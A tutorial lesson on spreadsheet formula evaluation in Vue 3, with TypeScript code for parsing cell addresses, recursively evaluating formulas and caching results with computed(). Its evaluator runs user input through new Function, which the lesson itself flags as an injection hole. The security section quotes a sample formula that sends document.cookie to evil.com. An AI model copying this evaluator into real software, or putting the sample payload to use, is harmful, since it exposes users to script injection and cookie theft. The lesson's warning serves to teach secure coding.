# Computed Values

## What you will build

Formula evaluation. Type `=A1+B1` in a cell — it shows the sum of A1 and B1. Change A1 — the formula cell updates automatically without touching any other code.

```
┌──────┬──────┬──────────┐
│   5  │  10  │ =A1+B1   │   ← you type this (raw value)
├──────┼──────┼──────────┤
│      │      │    15    │   ← the grid shows this (computed result)
└──────┴──────┴──────────┘
```

---

## What you need to know first

In lesson 3 we made cells editable and established the data flow: `App` owns `gridData`, events flow upward from `Cell`, mutations happen only in `App`. This lesson adds a second layer: `displayData` — a computed view of `gridData` where formula cells show their results instead of their raw strings.

We introduce `computed()` (derived reactive state) and composable functions (reusable logic packaged as a function).

---

## The lesson

### The problem

When a user types `=A1+B1`, we need to:
1. Detect it is a formula (starts with `=`)
2. Parse the cell references (`A1`, `B1`) into grid coordinates
3. Evaluate the arithmetic using the current cell values
4. Re-evaluate automatically whenever A1 or B1 changes

Step 4 is the key insight. Vue's `computed()` handles it — but only if the evaluation function reads reactive data.

---

### Step 1 — Cell address parsing

**The problem:** Before we can evaluate `=A1+B1`, we must convert `A1` into `{ rowIndex: 0, colIndex: 0 }` — a position in the 2D array.

```ts
// src/composables/useSpreadsheet.ts
function columnLetterToIndex(letter: string): number {
  return letter.toUpperCase().charCodeAt(0) - 'A'.charCodeAt(0)
}

function rowNumberToIndex(numStr: string): number {
  return parseInt(numStr, 10) - 1
}

function parseCellAddress(address: string): { rowIndex: number; colIndex: number } {
  const match = address.match(/^([A-Z]+)(\d+)$/)
  if (!match) throw new Error(`Invalid cell address: ${address}`)
  return {
    rowIndex: rowNumberToIndex(match[2]),
    colIndex: columnLetterToIndex(match[1]),
  }
}
```

**Walkthrough:** `columnLetterToIndex('A')` calls `charCodeAt(0)` on `'A'`. `charCodeAt(index)` returns the Unicode numeric code of the character at that index — `'A'` is 65, `'B'` is 66, `'Z'` is 90. Subtracting `'A'.charCodeAt(0)` (which is 65) converts the letter to a 0-based index: `'A'` → 0, `'B'` → 1, `'C'` → 2. Spreadsheets use 1-based row numbers (`1` is the first row), so `rowNumberToIndex` subtracts 1.

`address.match(/^([A-Z]+)(\d+)$/)` applies a regular expression (regex) to the string.

**What is a regular expression?** A pattern that matches strings. The regex `/^([A-Z]+)(\d+)$/` reads:
- `^` — must start at the beginning of the string
- `([A-Z]+)` — one or more uppercase letters; the parentheses create capture group 1
- `(\d+)` — one or more digits (`\d` matches any digit 0-9); capture group 2
- `$` — must end here (nothing after the digits)

`address.match(regex)` returns an array if the pattern matches: `match[0]` is the full match, `match[1]` is capture group 1 (the letter), `match[2]` is capture group 2 (the number). Returns `null` if no match.

**What is `parseInt(numStr, 10)`?** A built-in JavaScript function that parses a string as an integer. The second argument `10` specifies base-10 (decimal). Without the base, `parseInt` guesses the base from the string format — strings starting with `0x` are interpreted as hexadecimal. Always specify base-10 explicitly.

**CS concept — parsing:** A parser converts a string in some language (here, spreadsheet address notation like `"A1"`) into a structured representation (here, `{ rowIndex, colIndex }`). This pattern — match with a regex, extract groups, convert to a data structure — is the foundation of all language processing: compilers, interpreters, configuration file readers.

**SE principle — single responsibility:** `parseCellAddress` has one job: parse one cell address. It does not know about the grid's data, formulas, or evaluation. Changes to address format (e.g., supporting two-letter column names like `AA`) require changing only this function.

**What breaks if `match` is null:** `parseCellAddress` throws `Error: Invalid cell address: X`. The `evaluateFormula` function (next step) must catch this — otherwise an invalid formula crashes the app.

---

### Step 2 — Formula evaluation

**The problem:** Given a formula string like `"=A1+B1"` and the full grid data, compute the result.

```ts
type CellValue = number | string

function evaluateFormula(formula: string, rawData: CellValue[][]): number | string {
  const expression = formula.slice(1) // remove the leading '='

  const resolved = expression.replace(/[A-Z]+\d+/g, (address) => {
    const { rowIndex, colIndex } = parseCellAddress(address)
    const cellValue = rawData[rowIndex]?.[colIndex]

    if (typeof cellValue === 'string' && cellValue.startsWith('=')) {
      return String(evaluateFormula(cellValue, rawData)) // referenced cell is also a formula
    }

    return String(Number(cellValue) || 0)
  })

  try {
    // eslint-disable-next-line no-new-func
    const result = new Function(`return (${resolved})`)()
    return typeof result === 'number' ? result : String(result)
  } catch {
    return '#ERROR'
  }
}
```

**Walkthrough:** Step 1: `formula.slice(1)` removes the leading `=`, leaving `"A1+B1"`. `String.prototype.slice(1)` returns a new string starting from index 1 (0-based), discarding the character at index 0.

Step 2: `expression.replace(/[A-Z]+\d+/g, callback)` finds every cell address in the expression and replaces it. The regex `/[A-Z]+\d+/g` (no `^` or `$` anchors, plus the `g` flag) matches cell references anywhere in the string — the `g` flag means "global," replacing all matches instead of just the first. For `"A1+B1"`, the callback runs twice: once for `"A1"` (replaced with `"5"`) and once for `"B1"` (replaced with `"10"`). `resolved` becomes `"5+10"`.

Step 3: `new Function('return (5+10)')()` creates a JavaScript function whose body is `return (5+10)`, then immediately calls it. The result is `15`.

**What is `rawData[rowIndex]?.[colIndex]`?** Optional chaining (`?.`) was introduced in lesson 3. Here it guards against an out-of-bounds row: `rawData[rowIndex]` might be `undefined` if the formula references a row that does not exist. `?.` returns `undefined` instead of throwing `TypeError`.

**What is `String(Number(cellValue) || 0)`?** Two conversion functions: `Number(cellValue)` converts a value to a number — `Number("5")` → `5`, `Number(null)` → `0`, `Number("hello")` → `NaN`. The `|| 0` replaces `NaN` and other falsy values with `0` (so an empty cell contributes 0 to arithmetic). `String(...)` converts the number back to a string so it can be substituted into the expression string.

**Security — `new Function` and code injection:**

`new Function(str)` executes JavaScript code from a string. This is dangerous. If a formula contains `=fetch('https://evil.com', {body: document.cookie})`, that expression will run.

Our defence: the `replace` step substitutes only patterns matching `/[A-Z]+\d+/` (cell addresses). The remaining characters in the expression (`+`, `-`, `*`, `/`, `(`, `)`, digits) are arithmetic operators. A formula like `=fetch(1)` would not have `fetch` replaced (it does not match `[A-Z]+\d+`), so `resolved` would be `"fetch(1)"` — which `new Function` executes. This is a real vulnerability.

In a production spreadsheet, you would parse the formula into an abstract syntax tree and evaluate the AST yourself — never passing the string to `eval` or `new Function`. We use `new Function` here because writing a full expression parser is beyond this lesson's scope. In this series, we are inside a sandboxed iframe, which limits the blast radius.

The pattern to remember: **validate at the boundary, never trust user input**. When the input is code, the boundary must reject everything except a known-safe whitelist.

**CS concept — recursive evaluation:** When a formula references a cell that is itself a formula (`=C1` where C1 contains `=A1+B1`), `evaluateFormula` calls itself. This is recursion — a function that solves the problem by solving a smaller instance of the same problem. The recursion terminates when a cell's value is not a formula. Circular dependencies (`=A1` ← `=B1` ← `=A1`) cause infinite recursion (stack overflow) — handled in lesson 10.

**What breaks without the `try/catch`:** A formula like `=1/0` in JavaScript produces `Infinity` (not an error — JavaScript division by zero is defined). A formula like `=A1 +++ B1` (syntax error) causes `new Function` to throw `SyntaxError`. Without `try/catch`, one bad formula crashes `evaluateFormula` and prevents all cells from rendering.

---

### Step 3 — The `useSpreadsheet` composable

**The problem:** We need `displayData` — a version of `gridData` where formula cells show computed results — and we need it to update automatically whenever `gridData` changes.

```ts
// src/composables/useSpreadsheet.ts
import { ref, computed } from 'vue'

export function useSpreadsheet(initialData: CellValue[][]) {
  const rawData = ref<CellValue[][]>(initialData)

  const displayData = computed<(number | string)[][]>(() =>
    rawData.value.map((row) =>
      row.map((cell) => {
        if (typeof cell === 'string' && cell.startsWith('=')) {
          return evaluateFormula(cell, rawData.value)
        }
        return cell
      })
    )
  )

  function updateCell(rowIndex: number, colIndex: number, newValue: string) {
    const parsed = parseFloat(newValue)
    rawData.value[rowIndex][colIndex] = isNaN(parsed) ? newValue : parsed
  }

  return { rawData, displayData, updateCell }
}
```

**What is a composable?** A function with a name starting with `use` that sets up and returns reactive state and logic. `useSpreadsheet` creates `rawData`, computes `displayData`, and defines `updateCell`. Calling `useSpreadsheet(initialData)` in `App.vue` gives you all three. Composables are the Vue 3 replacement for mixins: they package reusable logic without the magic property injection that made mixins hard to trace.

**What is `computed()`?** `computed(callback)` creates a computed property — a reactive value derived from other reactive values. The `callback` runs when the computed is first accessed. Vue tracks which reactive values are read during the callback (`rawData.value` here). When any of those values change, Vue marks the computed stale and re-runs the callback the next time it is accessed.

**What is `import { ref, computed } from 'vue'`?**

- Both `ref` and `computed` are exports of the Vue framework's reactivity module.
- `ref` creates a reactive container for a single value (first introduced in lesson 2).
- `computed` creates a reactive derived value — one that automatically re-computes when its dependencies change.
- We import both as named imports because we need both. We do not import the whole `vue` package — named imports make the dependency explicit and enable tree-shaking (the build tool removes exports we never import).

**`computed()` vs a plain method:** A plain method `getDisplayData()` that maps `rawData.value` would work — once. But it would re-run every time the template accesses it, even if `rawData` had not changed. `computed()` caches its result. If `rawData` has not changed since the last access, Vue returns the cached result without re-running the callback. For a large spreadsheet, this is the difference between evaluating 100 formulas once per change vs. once per render frame.

**CS concept — memoisation:** Caching the result of an expensive computation keyed on its inputs. When the inputs have not changed, return the cached result. `computed()` is Vue's built-in memoisation for reactive values. Excel uses the same principle: formula cells are re-evaluated only when one of their inputs changes, not on every screen refresh.

**SE principle — separation of concerns:** `useSpreadsheet` owns all spreadsheet logic — data storage, formula evaluation, mutation. `Grid`, `Row`, and `Cell` know nothing about formulas. If we later replace `new Function` with a proper parser, we change only `useSpreadsheet.ts`.

**What breaks if `displayData` is a method instead of `computed`:** Every template access to `displayData` triggers a full map over `rawData` and evaluates every formula. In a 100-cell spreadsheet with 20 formula cells, a single render calls `evaluateFormula` 20 times. `computed()` calls it 0 times if nothing changed, 20 times only when a cell is edited.

---

### Step 4 — Connect to App.vue

**The problem:** Replace `gridData` in `App.vue` with `useSpreadsheet` so the grid displays computed results instead of raw formula strings.

```vue
<!-- src/App.vue -->
<script setup lang="ts">
import Grid from './components/Grid.vue'
import { useSpreadsheet } from './composables/useSpreadsheet'

const { displayData, updateCell } = useSpreadsheet([
  [5,  10, '=A1+B1'],
  [20, 25, '=A2+B2'],
  [35, 40, '=A3+B3'],
])
</script>

<template>
  <div class="spreadsheet">
    <Grid :rows="displayData" @update-cell="updateCell" />
  </div>
</template>
```

**Walkthrough:** `useSpreadsheet` is called once with the initial data. It returns `displayData` (the computed view) and `updateCell` (the mutation function). `App.vue` passes `displayData` to `Grid` instead of the raw data. The `Grid` renders what is displayed; `updateCell` handles what changes.

Try it: type `=A1+B1` in cell C1. The cell shows `15`. Change A1 to `100`. Cell C1 immediately shows `110` — without touching C1's formula or writing any update logic.

**What breaks without the `useSpreadsheet` wrapper:** If `displayData` is defined directly in `App.vue` as a computed referencing a local `rawData`, it works identically. The composable is an organisational choice — it prepares for lessons 5 through 12, which add formatting, selection, multiple sheets, and named ranges. Without the composable, all of that logic accumulates in `App.vue` until it becomes unmanageable.

**CS concept — derived state:** `displayData` is derived from `rawData` — it is a pure function of the raw data. Given the same `rawData`, `displayData` always produces the same result. Derived state never needs to be manually synchronised — it cannot drift out of sync with its source. This is why React's `useMemo`, Svelte's reactive declarations (`$: `), and MobX's `computed` exist. They are all the same idea: compute the view from the data, automatically.

---

## Connect the pieces

The reactive chain: `rawData` (ref) → `displayData` (computed) → `Grid` → `Row` → `Cell` → visible value.

When `updateCell` runs (from lesson 3's editing), it mutates `rawData`. Vue detects the mutation (via Proxy), marks `displayData` stale, and re-renders. Cells displaying formula results show their new values. No broadcast, no manual synchronisation.

**In production:** Google Sheets evaluates formulas exactly this way conceptually — a dependency graph where formula cells are derived from raw cells, re-evaluated when inputs change. Excel's calculation engine is famous for its performance optimisations around this same idea. The concept you learned here is the foundation of every reactive calculation system.

---

## What breaks without this

**If `displayData` were a plain array recomputed in `updateCell`:** You must manually reassign `displayData` every time any cell changes. Miss one mutation path (a future feature that writes to cells without going through `updateCell`) and formulas go stale silently. With `computed`, Vue ensures `displayData` is always in sync with `rawData` — there is no way to miss an update.

---

## Definition of done

- [ ] Typing `=A1+B1` in an empty cell shows the sum of A1 and B1
- [ ] Editing A1 causes the formula cell to update immediately
- [ ] A formula referencing another formula cell (e.g., `=C1+1`) evaluates correctly
- [ ] An invalid formula shows `#ERROR` without crashing
- [ ] Typing a plain number or text still works as in lesson 3
- [ ] **Git commit:**

```
git add src/
git commit -m "Add formula evaluation with computed() — formula cells update automatically when inputs change"
```
